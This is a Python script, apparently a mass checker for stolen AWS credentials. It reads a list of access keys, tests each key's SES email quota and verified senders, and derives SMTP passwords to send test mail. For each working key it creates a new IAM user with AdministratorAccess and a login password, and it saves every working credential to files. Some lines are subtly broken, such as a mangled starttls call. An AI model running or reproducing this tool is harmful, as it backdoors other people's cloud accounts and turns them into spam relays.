import  os, sys, codecs, random,json,base64,hmac,hashlib
import boto3
from botocore.exceptions import ClientError
import smtplib  
import email.utils
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText                    
from time import time as timer  
import time                 
from platform import system 
from colorama import Fore                               
from colorama import Style                              
from pprint import pprint                               
from colorama import init
from urllib.parse import urlparse
import warnings
import subprocess
from requests.packages.urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore',InsecureRequestWarning)

init(autoreset=True)
##########################################################################################
abang = '\033[31m'
ijo = '\033[32m'
kuning = '\033[33m'
biru = '\033[34m'
ungu = '\033[35m'
birumuda= '\033[36m'
grey = '\033[37m'
CEND = '\033[0m' 
year = time.strftime("%y")
month = time.strftime("%m")
###############################

def kirimawsses(hose,user,password,frome,terima):
    print((birumuda+'[>>] Trying Send SMTP With AWS SES'+CEND))
    try:
        SENDER = frome+"<"+frome+">"
        RECIPIENT = terima
        AWS_ACCESS_KEY = user
        AWS_SECRET_KEY = password
        AWS_REGION = hose
        SUBJECT = "Amazon SES Test"
        BODY_TEXT = ("Amazon SES Test\r\n"
                     "This email was sent with Amazon SES using the AWS SDK"
                    )
                    
        BODY_HTML = """<html>
        <head></head>
        <body>
          <h1>Amazon SES Test</h1>
          <p>This email was sent with using the AWS SDK</p>
        </body>
        </html>
                    """            
        CHARSET = "UTF-8"
        client = boto3.client('ses',region_name=AWS_REGION,aws_access_key_id=AWS_ACCESS_KEY,aws_secret_access_key=AWS_SECRET_KEY)
        response = client.send_email(
            Destination={
                'ToAddresses': [
                    RECIPIENT,
                ],
            },
            Message={
                'Body': {
                    'Html': {
                        'Charset': CHARSET,
                        'Data': BODY_HTML,
                    },
                    'Text': {
                        'Charset': CHARSET,
                        'Data': BODY_TEXT,
                    },
                },
                'Subject': {
                    'Charset': CHARSET,
                    'Data': SUBJECT,
                },
            },
            Source=SENDER,
        )
    except Exception as e:
        print((abang+e.response['Error']['Message']+CEND))
        open('can\'t_send_smtp_ses.txt', 'a').write('email-smtp.'+AWS_REGION+'.amazonaws.com|587|'+AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+frome+'\n')
    else:
        print(("Email sent! Message ID:"), end=' ')
        print((response['MessageId']))
        open('can_send_smtp_ses.txt', 'a').write('email-smtp.'+AWS_REGION+'.amazonaws.com|587|'+AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+frome+'\n')

def kirimismtp(hose,user,password,frome,terima):
    print((birumuda+'[>>] Trying Send SMTP With Auto Create SMTP'+CEND))
    try:
        SENDER = frome
        SENDERNAME = SENDER
        RECIPIENT  = terima
        USERNAME_SMTP = user
        PASSWORD_SMTP = password
        HOST = hose
        PORT = 587
        SUBJECT = 'Mail sent by '+HOST
        BODY_TEXT = ("Amazon SES Test\r\n"
                     "This email was sent through the Amazon SES SMTP "
                     "Interface using the Python smtplib package."
                    )

        BODY_HTML = """<html>
        <head></head>
        <body>
          <h1>SMTP TEST</h1>
          <p>This email was sent with Amazon SES using the
            <a href='https://www.python.org/'>Python</a>
            <a href='https://docs.python.org/3/library/smtplib.html'>
            smtplib</a> library.</p>
        </body>
        </html>
                    """
        msg = MIMEMultipart('alternative')
        msg['Subject'] = SUBJECT
        msg['From'] = email.utils.formataddr((SENDERNAME, SENDER))
        msg['To'] = RECIPIENT
        part1 = MIMEText(BODY_TEXT, 'plain')
        part2 = MIMEText(BODY_HTML, 'html')
        msg.attach(part1)
        msg.attach(part2)
        server = smtplib.SMTP(HOST, PORT)
        server.ehlo()
        server.Davidtls()
        server.ehlo()
        server.login(USERNAME_SMTP, PASSWORD_SMTP)
        server.sendmail(SENDER, RECIPIENT, msg.as_string())
        server.close()
    except Exception as e:
        print((abang+"Error: "+ str(e)+CEND))
        open('can\'t_send_smtp.txt', 'a').write(HOST+'|587|'+USERNAME_SMTP+'|'+PASSWORD_SMTP+'|'+frome+'\n')
    else:
        print((HOST+'|587|'+USERNAME_SMTP+'|'+PASSWORD_SMTP+'|'+frome+' '+ijo + 'Email sent! With SMTP ' + CEND))
        open('can_send_smtp.txt', 'a').write(HOST+'|587|'+USERNAME_SMTP+'|'+PASSWORD_SMTP+'|'+frome+'\n')

def atsmtp(user,pwd,region,emaile,su):
    try:
        message = "SendRawEmail"
        version = '\x02'
        h = hmac.new(pwd, message, digestmod=hashlib.sha256)
        jembot = base64.b64encode("{0}{1}".format(version, h.digest()))
        open('autocreatesmtp.txt', 'a').write('email-smtp.'+region+'.amazonaws.com|587|'+user+'|'+jembot+'|'+emaile+'|'+str(su)+'\n')
        kirimismtp('email-smtp.'+region+'.amazonaws.com',user,jembot,emaile,DavidBilla)
    except:
        pass
    pass

def goblok(usere,anune,dadine):
    print((birumuda+'[>>] Creating Iam User'+CEND))
    try:
        ACCESS_KEY = usere
        ACCESS_SECRET = anune
        AWS_REGION = dadine
        iam = boto3.client('iam', aws_access_key_id=ACCESS_KEY,aws_secret_access_key=ACCESS_SECRET,region_name=AWS_REGION)
        created_user = iam.create_user(UserName=pubg)
        if created_user['User']['UserName']:
            asu = created_user['User']['Arn'].split(':')
            response = iam.attach_user_policy(UserName = pubg, PolicyArn = 'arn:aws:iam::aws:policy/AdministratorAccess')
            asus = iam.create_login_profile(UserName=pubg, Password=snoopdog)
            print(('STATUS        : '+ijo+'CAN CREATE USER'+CEND))
            print(('ACCOUNT ID    : '+str(asu[4])))
            print(('IAM USERNAME  : '+str(created_user['User']['UserName'])))
            print(('PASSWORD      : '+str(snoopdog)))
            open('login.txt', 'a').write('STATUS        : CAN CREATE USER\nACCOUNT ID    : '+str(asu[4])+'\nIAM USERNAME  : '+str(created_user['User']['UserName'])+'\nPASSWORD      : '+str(snoopdog)+'\n\n')
        else:
            print((abang+'[xx] Failed Creating '+CEND))
    except Exception as e:
        print((abang+'[xx] Failed Creating '+CEND))
    pass

def kirimi(usere,anune,dadine):
    try:
        AWS_ACCESS_KEY = usere
        AWS_SECRET_KEY = anune
        AWS_REGION = dadine
        client = boto3.client('ses',region_name=AWS_REGION,aws_access_key_id=AWS_ACCESS_KEY,aws_secret_access_key=AWS_SECRET_KEY)
        asu = client.get_send_quota()
        y = json.dumps(asu)
        x = json.loads(y)
        if 'Max24HourSend' in x:
            print((AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+AWS_REGION+'|'+str(x['Max24HourSend'])))
            open('goodaws.txt', 'a').write(AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+AWS_REGION+'|' 'Limit => '+str(x['Max24HourSend'])+'\n')
            goblok(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION)
            response = client.list_identities(
                IdentityType='EmailAddress',
                MaxItems=123,
                NextToken='',
                )
            for a in response['Identities']:
                print(('email-smtp.'+AWS_REGION+'.amazonaws.com|587|'+AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+str(a)))
                open('smtpses.txt', 'a').write('email-smtp.'+AWS_REGION+'.amazonaws.com|587|'+AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+a+'|'+str(x['Max24HourSend'])+'\n')
                kirimawsses(AWS_REGION,AWS_ACCESS_KEY,AWS_SECRET_KEY,a,DavidBilla)
                atsmtp(AWS_ACCESS_KEY,AWS_SECRET_KEY,AWS_REGION,a,x['Max24HourSend'])
        else:
            print((AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+AWS_REGION+'| => BAD'))
        # Display an error if something goes wrong.\t
    except Exception as e:
        print((AWS_ACCESS_KEY+'|'+AWS_SECRET_KEY+'|'+AWS_REGION+'| => BAD'))
        print(("InfO : "+e))
    pass

def logo():
    clear = "\x1b[0m"
    colors = [32]
    x = ''' 
  ___  _    _ _____   _____ _               _             
 / _ \| |  | /  ___| /  __ \ |BackdoorBilla| |            
/ /_\ \ |  | \ `--.  | /  \/ |__   ___  ___| | _____ _ __ 
|  _  | |/\| |`--. \ | |   | '_ \ / _ \/ __| |/ / _ \ '__|BackdoorBilla
| | | \  /\  /\__/ / | \__/\ | | |  __/ (__|   <  __/ |   
\_| |_/\/  \/\____/   \____/_| |_|\___|\___|_|\_\___|_|Backdoorilla


Join https://t.me/tutorials_zone                                                                                   

 -Mass AWS Limit Checker  -Auto Get Mail From
 -Auto Create SMTP        -Auto Creat Login Aws Panel
 -Auto Test Sendmail
    '''

    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
        pass


logo()

##########################################################################################
David = timer()
Billa = input('root@DavidBilla:~# List : ')
DavidBilla = input('root@DavidBilla:~# Enter your mail : ')
pubg = input('root@DavidBilla:~# Username For IAM USER : ')
snoopdog = input('root@DavidBilla:~# Password For IAM USER : ')
master = open(Billa, 'r').readlines()
for i in master:
    try:
        site = i.strip()
        bagi = site.split("|")
        kirimi(bagi[0],bagi[1],bagi[2])
    except:
        pass
print(('TIME TAKE: ' + str(timer() - David) + ' S'))